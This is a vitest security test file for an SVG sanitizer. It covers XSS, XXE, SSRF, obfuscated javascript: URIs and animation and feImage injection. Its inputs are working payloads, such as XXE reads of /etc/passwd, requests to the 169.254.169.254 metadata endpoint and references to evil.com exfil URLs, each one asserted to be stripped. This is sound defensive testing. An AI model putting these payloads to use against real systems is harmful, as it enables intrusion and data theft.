/**
 * Comprehensive security tests for the SVG sanitizer.
 *
 * Covers all known SVG-based attack vectors: XSS, XXE, SSRF, URI scheme
 * obfuscation, animation injection, and filter-based SSRF.
 */
import { describe, expect, it } from "vitest";
import { sanitizeSvg } from "../../../apps/api/src/lib/svg-sanitize.js";

/** Wrap a payload fragment inside a minimal valid SVG. */
function wrapSvg(inner: string, attrs = ""): string {
  return `<svg xmlns="http://www.w3.org/2000/svg"${attrs ? ` ${attrs}` : ""}>${inner}</svg>`;
}

/** Run sanitizeSvg on a string and return the result as a string. */
function sanitize(svg: string): string {
  return sanitizeSvg(Buffer.from(svg, "utf-8")).toString("utf-8");
}

// ── XSS: Script Injection ────────────────────────────────────────────────────

describe("SVG sanitizer -- XSS script injection", () => {
  it("strips standard <script> tags", () => {
    const svg = wrapSvg("<script>alert(1)</script>");
    const result = sanitize(svg);
    expect(result).not.toContain("<script");
    expect(result).not.toContain("alert(1)");
    expect(result).toContain("<svg");
  });

  it("strips case-varied <SCRIPT> tags", () => {
    const svg = wrapSvg("<SCRIPT>alert(1)</SCRIPT>");
    const result = sanitize(svg);
    expect(result).not.toMatch(/<script/i);
    expect(result).not.toContain("alert(1)");
  });

  it("strips nested SVG with script", () => {
    const svg = wrapSvg("<svg><svg><script>alert(1)</script></svg></svg>");
    const result = sanitize(svg);
    expect(result).not.toContain("<script");
    expect(result).not.toContain("alert(1)");
  });
});

// ── XSS: Event Handlers ─────────────────────────────────────────────────────

describe("SVG sanitizer -- event handler injection", () => {
  it("removes onload event handler", () => {
    const svg = wrapSvg('<rect width="10" height="10" onload="alert(1)"/>');
    const result = sanitize(svg);
    expect(result).not.toMatch(/\bonload\s*=/i);
    expect(result).toContain('data-removed=""');
  });
});

// ── XSS: CDATA Bypass ───────────────────────────────────────────────────────

describe("SVG sanitizer -- CDATA bypass", () => {
  it("strips CDATA sections that hide script content", () => {
    const svg = wrapSvg("<script><![CDATA[alert(1)]]></script>");
    const result = sanitize(svg);
    expect(result).not.toContain("CDATA");
    expect(result).not.toContain("<script");
    expect(result).not.toContain("alert(1)");
  });
});

// ── XXE: External Entity Attacks ─────────────────────────────────────────────

describe("SVG sanitizer -- XXE attacks", () => {
  it("removes DOCTYPE with file-read XXE entity", () => {
    const svg =
      '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' +
      '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>';
    const result = sanitize(svg);
    expect(result).not.toMatch(/<!DOCTYPE/i);
    expect(result).not.toContain("file:///etc/passwd");
  });

  it("removes DOCTYPE with SSRF XXE entity", () => {
    const svg =
      '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>' +
      '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>';
    const result = sanitize(svg);
    expect(result).not.toMatch(/<!DOCTYPE/i);
    expect(result).not.toContain("169.254.169.254");
  });

  it("removes XML entity bypass with entity-encoded javascript URI", () => {
    // This tests the scenario where an entity defines an obfuscated javascript: URI.
    // The DOCTYPE (and its entity definitions) are stripped entirely, making &x; unresolvable.
    const svg =
      '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x "&#x6A;avascript:alert(1)">]>' +
      '<svg xmlns="http://www.w3.org/2000/svg"><a href="&x;"><text>click</text></a></svg>';
    const result = sanitize(svg);
    expect(result).not.toMatch(/<!DOCTYPE/i);
    expect(result).not.toContain("javascript:");
  });
});

// ── foreignObject ────────────────────────────────────────────────────────────

describe("SVG sanitizer -- foreignObject", () => {
  it("strips foreignObject with embedded HTML body", () => {
    const svg = wrapSvg(
      '<foreignObject width="100" height="100">' +
        '<body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body>' +
        "</foreignObject>",
    );
    const result = sanitize(svg);
    expect(result).not.toContain("<foreignObject");
    expect(result).not.toContain("</foreignObject>");
    expect(result).not.toContain("<script");
  });

  it("strips mixed-case <ForeignObject> variant", () => {
    const svg = wrapSvg("<ForeignObject><body>malicious</body></ForeignObject>");
    const result = sanitize(svg);
    expect(result).not.toMatch(/<foreignObject/i);
  });
});

// ── URI Scheme Attacks ───────────────────────────────────────────────────────

describe("SVG sanitizer -- dangerous URI schemes", () => {
  it("blocks data: URI in href", () => {
    const svg = wrapSvg(
      '<a href="data:text/html,<script>alert(1)</script>"><text>click</text></a>',
    );
    const result = sanitize(svg);
    expect(result).not.toMatch(/href\s*=\s*["']data:text\/html/i);
  });

  it("blocks entity-encoded javascript: URI in href", () => {
    const svg = wrapSvg(
      '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">' +
        "<text>click</text></a>",
    );
    const result = sanitize(svg);
    expect(result).not.toContain("javascript:");
    expect(result).not.toMatch(/href\s*=\s*["']javascript:/i);
  });

  it("blocks newline-obfuscated javascript: URI in href", () => {
    const svg = wrapSvg('<a href="java\nscript:alert(1)"><text>click</text></a>');
    const result = sanitize(svg);
    expect(result).not.toContain("javascript:");
    expect(result).not.toMatch(/href\s*=\s*["']javascript:/i);
  });

  it("blocks null-byte-obfuscated javascript: URI in href", () => {
    const svg = wrapSvg('<a href="java\x00script:alert(1)"><text>click</text></a>');
    const result = sanitize(svg);
    expect(result).not.toContain("javascript:");
    expect(result).not.toMatch(/href\s*=\s*["']javascript:/i);
  });

  it("blocks tab-obfuscated javascript: URI in href", () => {
    const svg = wrapSvg('<a href="java\tscript:alert(1)"><text>click</text></a>');
    const result = sanitize(svg);
    expect(result).not.toContain("javascript:");
    expect(result).not.toMatch(/href\s*=\s*["']javascript:/i);
  });

  it("blocks embedded image with data:text/html href", () => {
    const svg = wrapSvg(
      '<image href="data:text/html,<script>alert(1)</script>" width="100" height="100"/>',
    );
    const result = sanitize(svg);
    expect(result).not.toMatch(/href\s*=\s*["']data:text\/html/i);
  });
});

// ── XInclude ─────────────────────────────────────────────────────────────────

describe("SVG sanitizer -- XInclude", () => {
  it("strips xi:include elements and namespace", () => {
    const svg = wrapSvg(
      '<xi:include href="file:///etc/passwd" parse="text"/>',
      'xmlns:xi="http://www.w3.org/2001/XInclude"',
    );
    const result = sanitize(svg);
    expect(result).not.toContain("xi:include");
    expect(result).not.toContain("xmlns:xi");
    expect(result).not.toContain("file:///etc/passwd");
  });
});

// ── External <use> href ──────────────────────────────────────────────────────

describe("SVG sanitizer -- external <use> href", () => {
  it("removes <use> with external xlink:href", () => {
    const svg = wrapSvg(
      '<use xlink:href="http://evil.com/malicious.svg#payload"/>',
      'xmlns:xlink="http://www.w3.org/1999/xlink"',
    );
    const result = sanitize(svg);
    expect(result).not.toContain("evil.com");
    expect(result).not.toContain("<use");
  });

  it("removes <use> with external href (no xlink)", () => {
    const svg = wrapSvg('<use href="https://evil.com/malicious.svg#payload"/>');
    const result = sanitize(svg);
    expect(result).not.toContain("evil.com");
    expect(result).not.toContain("<use");
  });

  it("preserves <use> with internal fragment reference", () => {
    const svg = wrapSvg('<defs><rect id="r" width="10" height="10"/></defs><use href="#r"/>');
    const result = sanitize(svg);
    expect(result).toContain("<use");
    expect(result).toContain('href="#r"');
  });
});

// ── Animation Injection ──────────────────────────────────────────────────────

describe("SVG sanitizer -- animation injection", () => {
  it("strips <set> elements that inject event handlers", () => {
    const svg = wrapSvg('<set attributeName="onmouseover" to="alert(1)"/>');
    const result = sanitize(svg);
    expect(result).not.toContain("<set");
    expect(result).not.toContain("onmouseover");
  });

  it("strips <animate> elements with javascript: values", () => {
    const svg = wrapSvg('<animate attributeName="href" values="javascript:alert(1)"/>');
    const result = sanitize(svg);
    expect(result).not.toContain("<animate");
    expect(result).not.toContain("javascript:");
  });
});

// ── feImage SSRF ─────────────────────────────────────────────────────────────

describe("SVG sanitizer -- feImage SSRF", () => {
  it("strips <feImage> with external HTTP href (cloud metadata SSRF)", () => {
    const svg = wrapSvg(
      '<defs><filter id="f">' +
        '<feImage href="http://169.254.169.254/latest/meta-data/"/>' +
        "</filter></defs>" +
        '<rect filter="url(#f)" width="100" height="100"/>',
    );
    const result = sanitize(svg);
    expect(result).not.toContain("169.254.169.254");
    expect(result).not.toContain("<feImage");
  });

  it("strips <feImage> with HTTPS external href", () => {
    const svg = wrapSvg(
      '<defs><filter id="f">' + '<feImage href="https://evil.com/exfil"/>' + "</filter></defs>",
    );
    const result = sanitize(svg);
    expect(result).not.toContain("evil.com");
    expect(result).not.toContain("<feImage");
  });

  it("strips <feImage> with file: href", () => {
    const svg = wrapSvg(
      '<defs><filter id="f">' + '<feImage href="file:///etc/passwd"/>' + "</filter></defs>",
    );
    const result = sanitize(svg);
    expect(result).not.toContain("file:///etc/passwd");
    expect(result).not.toContain("<feImage");
  });

  it("strips <feImage> with data: href", () => {
    const svg = wrapSvg(
      '<defs><filter id="f">' +
        '<feImage href="data:text/html,<script>alert(1)</script>"/>' +
        "</filter></defs>",
    );
    const result = sanitize(svg);
    expect(result).not.toMatch(/<feImage[^>]*data:text\/html/i);
  });

  it("strips <feImage> with xlink:href external URL", () => {
    const svg = wrapSvg(
      '<defs><filter id="f">' +
        '<feImage xlink:href="http://169.254.169.254/latest/meta-data/"/>' +
        "</filter></defs>",
      'xmlns:xlink="http://www.w3.org/1999/xlink"',
    );
    const result = sanitize(svg);
    expect(result).not.toContain("169.254.169.254");
    expect(result).not.toContain("<feImage");
  });

  it("preserves <feImage> with internal fragment reference", () => {
    const svg = wrapSvg(
      '<defs><rect id="src" width="10" height="10" fill="red"/>' +
        '<filter id="f"><feImage href="#src"/></filter></defs>' +
        '<rect filter="url(#f)" width="100" height="100"/>',
    );
    const result = sanitize(svg);
    expect(result).toContain("<feImage");
    expect(result).toContain('href="#src"');
  });
});

// ── url() in style attributes ────────────────────────────────────────────────

describe("SVG sanitizer -- url() scheme blocking", () => {
  it("blocks data: scheme inside url() property values", () => {
    const svg = wrapSvg(
      '<rect style="background:url(data:text/html,payload)" width="10" height="10"/>',
    );
    const result = sanitize(svg);
    expect(result).not.toMatch(/url\s*\(\s*["']?data:text\/html/i);
  });
});

// ── Clean SVGs pass through ──────────────────────────────────────────────────

describe("SVG sanitizer -- clean SVGs pass through", () => {
  it("preserves a minimal clean SVG unchanged", () => {
    const clean = '<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>';
    const result = sanitize(clean);
    expect(result).toBe(clean);
  });

  it("preserves internal CSS styles", () => {
    const clean =
      '<svg xmlns="http://www.w3.org/2000/svg"><style>rect { fill: red; }</style><rect width="10" height="10"/></svg>';
    const result = sanitize(clean);
    expect(result).toContain("<style>");
    expect(result).toContain("fill: red");
  });

  it("preserves internal fragment href in <use>", () => {
    const clean =
      '<svg xmlns="http://www.w3.org/2000/svg"><defs><rect id="r" width="10" height="10"/></defs><use href="#r"/></svg>';
    const result = sanitize(clean);
    expect(result).toContain('href="#r"');
  });
});
